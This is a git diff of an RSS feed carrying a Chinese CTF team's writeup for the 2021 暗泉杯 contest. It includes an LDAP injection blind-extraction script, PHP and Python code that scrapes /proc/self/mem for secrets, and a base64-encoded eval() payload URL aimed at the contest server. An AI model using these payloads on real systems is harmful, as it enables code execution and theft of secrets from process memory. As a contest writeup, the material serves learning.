@@ -12,7 +12,8 @@
         <pubDate>Mon, 06 Dec 2021 19:23:41 +0800</pubDate>
         
         <guid>https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/</guid>
-        <description>&lt;img src="https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams.png" alt="Featured image of post 2021暗泉杯 Writeup" /&gt;&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
+        <description>&lt;img src="https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams.png" alt="Featured image of post 2021暗泉杯 Writeup" /&gt;&lt;p&gt;&lt;code&gt;*&lt;/code&gt; 开头题目表示赛后补题&lt;/p&gt;
+&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
 &lt;h3 id=&#34;签到flag&#34;&gt;[签到]flag&lt;/h3&gt;
 &lt;p&gt;等一个一个拼出来，业余web手的笨B做题法&lt;/p&gt;
 &lt;h3 id=&#34;萌odd_upload&#34;&gt;[萌]odd_upload&lt;/h3&gt;
@@ -41,9 +42,9 @@
 &lt;p&gt;The flag is a special email address username.It is attribute of one  account and there are multiple accounts in the directory. flag is  composed of a-z0-9_&lt;/p&gt;
 &lt;p&gt;说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？&lt;/p&gt;
 &lt;p&gt;按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&#39;(&amp;lsquo;或者&amp;rsquo;)&amp;lsquo;就会报错：&lt;/p&gt;
-&lt;p&gt;Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48
-Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49&lt;/p&gt;
-&lt;p&gt;有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48
+Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
 url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://47.106.172.144:2333/&amp;#34;&lt;/span&gt;
 alphabet &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;abcdefghijklmnopqrstuvwxyz0123456789_&amp;#39;&lt;/span&gt;
@@ -60,7 +61,72 @@ alphabet &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style
         &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
             print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Error: [&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
 search(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;wschat&#34;&gt;wschat&lt;/h3&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;hideandseek&#34;&gt;*hideandseek&lt;/h3&gt;
+&lt;p&gt;和web没有啥关系，和二进制全是关系。&lt;/p&gt;
+&lt;p&gt;先附上打本地的DockerFile:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dockerfile&#34; data-lang=&#34;dockerfile&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; php:8.1.0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ADD&lt;/span&gt; ./src /var/www/html&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ADD&lt;/span&gt; ./flag /flag&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;WORKDIR&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; /var/www/html/&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; chmod -R  &lt;span style=&#34;color:#ae81ff&#34;&gt;0555&lt;/span&gt;  /var/www/html/&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;CMD&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;php&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-S&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0.0.0.0:8000&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-t&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/var/www/html&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这题上先读flag，然后把flag给覆盖了，你只有一次执行任意代码的机会。&lt;/p&gt;
+&lt;p&gt;思路上来一下子就指向了&lt;code&gt;/proc&lt;/code&gt;，进程目录，我们肯定是能通过分析这个进程把flag拿到了。目前已知的&lt;code&gt;/proc&lt;/code&gt;的博客有：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://whoamianony.top/2021/06/09/Web%E5%AE%89%E5%85%A8/Proc%20%E7%9B%AE%E5%BD%95%E5%9C%A8%20CTF%20%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://whoamianony.top/2021/06/09/Web%E5%AE%89%E5%85%A8/Proc%20%E7%9B%AE%E5%BD%95%E5%9C%A8%20CTF%20%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/10579&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://xz.aliyun.com/t/10579&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;第一反应是读fd，看看文件的符号链接，如果fopen了，但没fclose就有可能在fd里找到，本地一试发现没有。&lt;/p&gt;
+&lt;p&gt;于是考虑利用别的，比如&lt;code&gt;./exe&lt;/code&gt;，是一个ELF文件，但可惜&lt;code&gt;strings ./exe&lt;/code&gt;没用，因为flag变量是在运行时读取的，生成elf是不存在这个字符串的，于是就读&lt;code&gt;./mem&lt;/code&gt;，&lt;code&gt;/proc/{PID}/mem&lt;/code&gt;是可用于访问进程的内存的页面。但是发现读取失败了，报错如下：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cat mem: Input/output error
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;搜到了解释原因：https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/proc/$pid/mem&lt;/code&gt;显示$pid 内存的内容与进程中的映射方式相同，即伪文件中偏移&lt;em&gt;x&lt;/em&gt;处的字节与进程中地址&lt;em&gt;x&lt;/em&gt;处的字节相同。如果在进程中未映射地址，则从文件中的相应偏移量读取返回&lt;code&gt;EIO&lt;/code&gt;（输入/输出错误）。例如，由于进程中的第一页永远不会被映射（因此取消引用&lt;code&gt;NULL&lt;/code&gt;指针会完全失败，而不是无意中访问实际内存），因此读取 的第一个字节&lt;code&gt;/proc/$pid/mem&lt;/code&gt;总是会产生 I/O 错误。&lt;/p&gt;
+&lt;p&gt;同时也拿到了一份用python拿内存信息的脚本：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; re
+maps_file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/proc/self/maps&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;)
+mem_file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/proc/self/mem&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
+output_file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;self.dump&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; line &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; maps_file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;readlines():  &lt;span style=&#34;color:#75715e&#34;&gt;# for each mapped region&lt;/span&gt;
+    m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; re&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])&amp;#39;&lt;/span&gt;, line)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;group(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;:  &lt;span style=&#34;color:#75715e&#34;&gt;# if this is a readable region&lt;/span&gt;
+        start &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;group(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+        end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;group(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+        mem_file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;seek(start)  &lt;span style=&#34;color:#75715e&#34;&gt;# seek to region start&lt;/span&gt;
+        chunk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mem_file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read(end &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; start)  &lt;span style=&#34;color:#75715e&#34;&gt;# read region contents&lt;/span&gt;
+        output_file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(chunk)  &lt;span style=&#34;color:#75715e&#34;&gt;# dump contents to standard output&lt;/span&gt;
+maps_file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+mem_file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+output_file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我盲猜flag就在内存里，但我也不是打二进制的，也不知道在哪，于是就打算把整个chunk全部正则匹配即可。&lt;/p&gt;
+&lt;p&gt;把上述代码翻译成php，修改部分内容如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+$maps_file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fopen&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/proc/self/maps&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;);
+$mem_file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fopen&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/proc/self/mem&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;feof&lt;/span&gt;($maps_file)) {
+    $line &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fgets&lt;/span&gt;($maps_file);&lt;span style=&#34;color:#75715e&#34;&gt;//fgets()函数从文件指针中读取一行
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])/&amp;#34;&lt;/span&gt;, $line, $match);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($match[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;) {
+        $start &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;hexdec&lt;/span&gt;($match[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);
+        $end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;hexdec&lt;/span&gt;($match[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]);
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;fseek&lt;/span&gt;($mem_file, $start);
+        $chunk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fread&lt;/span&gt;($mem_file, $end &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; $start);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/flag\{.*\}/&amp;#34;&lt;/span&gt;, $chunk)) {
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/(flag\{.*\})/&amp;#34;&lt;/span&gt;, $chunk, $ans);
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;var_dump&lt;/span&gt;($ans);
+        }
+
+    }
+}
+&lt;span style=&#34;color:#a6e22e&#34;&gt;fclose&lt;/span&gt;($maps_file);
+&lt;span style=&#34;color:#a6e22e&#34;&gt;fclose&lt;/span&gt;($mem_file);
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后用base64+urlencode传参（有了安洵杯的教训，base64一定要编码），最终payload如下：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://5b599005-3dfe-44e4-ac13-96fc3b194f3e.nssctf.neusoft.edu.cn/?eval=eval(base64_decode(%22JG1hcHNfZmlsZSA9IGZvcGVuKCIvcHJvYy9zZWxmL21hcHMiLCAiciIpOwokbWVtX2ZpbGUgPSBmb3BlbigiL3Byb2Mvc2VsZi9tZW0iLCAicmIiKTsKd2hpbGUoISBmZW9mKCRtYXBzX2ZpbGUpKSB7CiAgICAgICAgJGxpbmUgPSBmZ2V0cygkbWFwc19maWxlKTsvL2ZnZXRzKCnlh73mlbDku47mlofku7bmjIfpkojkuK3or7vlj5bkuIDooYwKICAgICAgICAgICAgJG0gPSBwcmVnX21hdGNoKCIvKFswLTlBLUZhLWZdKyktKFswLTlBLUZhLWZdKykgKFstcl0pLyIsICRsaW5lLCAkbWF0Y2gpOwogICAgICAgICAgICBpZigkbWF0Y2hbM10gPT0gJ3InKSB7CiAgICAgICAgICAgICAgICAgICAgJHN0YXJ0ID0gaGV4ZGVjKCRtYXRjaFsxXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICRlbmQgPSBoZXhkZWMoJG1hdGNoWzJdKTsKICAgICAgICAgICAgICAgICAgICAgICAgZnNlZWsoJG1lbV9maWxlLCAkc3RhcnQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNodW5rID0gZnJlYWQoJG1lbV9maWxlLCAkZW5kIC0gJHN0YXJ0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKHByZWdfbWF0Y2goIi9mbGFnXHsuKlx9LyIsICRjaHVuaykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByZWdfbWF0Y2goIi8oZmxhZ1x7LipcfSkvIiwgJGNodW5rLCAkYW5zKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyX2R1bXAoJGFucyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KfQpmY2xvc2UoJG1hcHNfZmlsZSk7CmZjbG9zZSgkbWVtX2ZpbGUpOw%3D%3D%22));
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;wschat&#34;&gt;*wschat&lt;/h3&gt;
 &lt;p&gt;前后端交互用的是socket io，参数格式用的是protobuf，前端的js加了很多混淆和反调试。可以在这个网站https://lelinhtinh.github.io/de4js/做个简单的恢复后再看。&lt;/p&gt;
 &lt;p&gt;贴一下我恢复后的还算是能看的关键代码：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
